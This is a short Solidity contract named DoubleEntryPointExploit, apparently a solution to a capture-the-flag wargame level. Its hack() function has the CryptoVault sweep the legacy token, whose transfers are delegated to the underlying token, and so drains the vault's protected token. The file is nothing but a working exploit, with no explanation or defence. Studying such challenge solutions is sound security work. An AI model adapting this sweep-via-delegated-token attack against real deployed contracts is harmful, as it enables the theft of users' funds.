// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "../../src/DoubleEntryPoint/DoubleEntryPoint.sol";
import "../../exploits/BlockUtils.sol";

contract DoubleEntryPointExploit is BlockUtils {

    DoubleEntryPoint victim;

    constructor(address _victim) {
        victim = DoubleEntryPoint(payable(_victim));
    }

    function hack() public {
        CryptoVault vault = CryptoVault(victim.cryptoVault());
        IERC20 lgt = IERC20(victim.delegatedFrom());
        vault.sweepToken(lgt);
    }

    receive() external payable {}
}